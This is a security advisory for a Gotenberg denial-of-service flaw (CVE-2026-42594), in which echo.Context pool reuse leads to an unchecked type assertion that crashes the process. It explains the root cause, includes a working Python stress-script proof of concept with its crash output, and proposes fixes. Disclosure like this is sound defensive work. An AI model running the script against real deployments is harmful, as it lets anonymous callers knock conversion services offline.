# [H] Gotenberg has an unauthenticated denial of service via echo.Context pool reuse in webhook async goroutine

## Summary
Severity: High
Advisory: GHSA-r33j-c622-r6qp
CVE: CVE-2026-42594
CWE: CWE-362
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-r33j-c622-r6qp
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0 <8.32.0

## Details
## Summary

The webhook middleware spawns a goroutine that holds a reference to the request's `echo.Context` after the synchronous handler returns `ErrAsyncProcess` and Echo recycles the context back to its `sync.Pool`. When a concurrent request claims the recycled context, `c.Reset()` clears the store. If the webhook goroutine reaches `hardTimeoutMiddleware` at that moment, an unchecked type assertion on a nil store entry panics outside any `recover()` scope, crashing the Gotenberg process. Any anonymous caller reaches the webhook path (default `webhook-deny-list` filters only the webhook destination, not the submitter). A single-source stress of ~24 webhook requests plus ~60 `GET /version` requests crashes the process in about two seconds.

## Details

`pkg/modules/webhook/middleware.go:338-382` starts the async goroutine and immediately returns `api.ErrAsyncProcess` to the caller:

```go
w.asyncCount.Add(1)
go func() {
    defer cancel()
    defer w.asyncCount.Add(-1)

    err := next(c)                    // line 343
    ...
    sendOutputFile(sendOutputFileParams{ ctx: ctx, ... })
}()

return api.ErrAsyncProcess             // line 382
```

`pkg/modules/api/middlewares.go:356-361` sees the sentinel, responds with `204 No Content`, and lets Echo return `c` to the pool:

```go
if errors.Is(err, ErrAsyncProcess) {
    return c.NoContent(http.StatusNoContent)
}
```

Echo's router calls `c.Reset()` before serving the next request from the same goroutine pool slot, wiping `c.store`. When the webhook goroutine's `next(c)` enters `hardTimeoutMiddleware` at `pkg/modules/api/middlewares.go:396-398`, the handler dereferences the store before the new recover scope exists:

```go
return func(c echo.Context) error {
    logger := c.Get("logger").(*slog.Logger)   // line 398

    ...
    go func() {
        defer func() { if r := recover(); r != nil { ... } }()   // recover is scoped here
        errChan <- next(c)
    }()
```

If a concurrent request has just acquired `c` from the pool, `c.Get("logger")` returns `nil`, and `nil.(*slog.Logger)` panics at line 398. The panic is not inside any goroutine with a `recover()`, so the Go runtime terminates the process with exit code 2.

No `echo.Recover` middleware is registered (`pkg/modules/api/api.go:480-536`). `GOTRACEBACK` defaults propagate the panic to stderr and exit.

## Proof of Concept

Reproduction on the stock Docker image with default configuration:

```bash
docker run -d --name gotenberg-poc -p 3000:3000 \
    -e GOTRACEBACK=all gotenberg/gotenberg:8 gotenberg --log-level=error
```

Single-process stress script (Alice sends both streams, no second actor):

```python
import requests, subprocess, time, json, threading

TARGET  = "http://localhost:3000"
WEBHOOK = "http://httpbin.org/post"   # passes default webhook-deny-list
STOP    = threading.Event()
html    = b"<html><body><h1>Q</h1></body></html>"

def webhook_fire():
    s = requests.Session()
    while not STOP.is_set():
        try:
            s.post(
                f"{TARGET}/forms/chromium/convert/html",
                files={"files": ("index.html", html, "text/html")},
                headers={
                    "Gotenberg-Webhook-Url":       WEBHOOK,
                    "Gotenberg-Webhook-Error-Url": WEBHOOK,
                },
                timeout=15,
            )
        except: pass

def noise_fire():
    s = requests.Session()
    while not STOP.is_set():
        try: s.get(f"{TARGET}/version", timeout=2)
        except: pass

for _ in range(24): threading.Thread(target=webhook_fire, daemon=True).start()
for _ in range(60): threading.Thread(target=noise_fire,   daemon=True).start()

t0 = time.time()
while time.time() - t0 < 60:
    time.sleep(1)
    status = json.loads(subprocess.run(
        ["docker", "inspect", "gotenberg-poc"],
        capture_output=True, text=True, check=True).stdout)[0]["State"]
    if status["Status"] != "running":
        print(f"process crashed after {time.time()-t0:.1f}s, exit code {status['ExitCode']}")
        STOP.set()
        break
```

Observed output:

```
process crashed after 2.2s, exit code 2
```

Container stderr captured with `docker logs gotenberg-poc`:

```
panic: interface conversion: interface {} is nil, not *slog.Logger
goroutine 287020 [running]:
    /home/pkg/modules/api/middlewares.go:398 +0x2e6
    /home/pkg/modules/webhook/middleware.go:343 +0xec
created by github.com/gotenberg/gotenberg/v8/pkg/modules/webhook.(*Webhook).Middlewares.webhookMiddleware.func1.func2.2
    /home/pkg/modules/webhook/middleware.go:338 +0x1176
```

## Impact

Any client that can reach the Gotenberg API crashes the process. Auto-restart policies (`--restart=always`, Kubernetes liveness probes, Compose defaults) let Gotenberg come back up, but each crash drops every in-flight conversion, abandons pending webhook deliveries, and resets internal state. Sustained attack traffic keeps the process in a restart loop, producing continuous unavailability. The webhook-deny-list blocks attacker-chosen webhook destinations inside private networks, but does not filter the submitter of the request, so an unauthenticated Internet attacker drives the crash with only the ability to reach port 3000.

## Recommended Fix

Replace the unchecked type assertion at `pkg/modules/api/middlewares.go:398` with a guarded lookup that handles the pool-reuse case:

```go
logger, _ := c.Get("logger").(*slog.Logger)
if logger == nil {
    return errors.New("context reused from pool before middleware chain populated it")
}
```

Also add a `defer recover()` at the top of the webhook goroutine body at `pkg/modules/webhook/middleware.go:338` so any future panic downstream does not kill the process:

```go
go func() {
    defer func() {
        if r := recover(); r != nil {
            ctx.Log().Error(fmt.Sprintf("webhook goroutine panic: %v", r))
            handleError(fmt.Errorf("internal error: %v", r))
        }
    }()
    defer cancel()
    defer w.asyncCount.Add(-1)
    ...
}()
```

A deeper fix detaches `echo.Context` from `api.Context` before the goroutine runs: extract every value the goroutine needs (output filename, logger, correlation fields) into plain variables or struct fields, then clear `ctx.echoCtx` so downstream code cannot reach the pooled context.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-r33j-c622-r6qp
- https://nvd.nist.gov/vuln/detail/CVE-2026-42594
- https://github.com/gotenberg/gotenberg
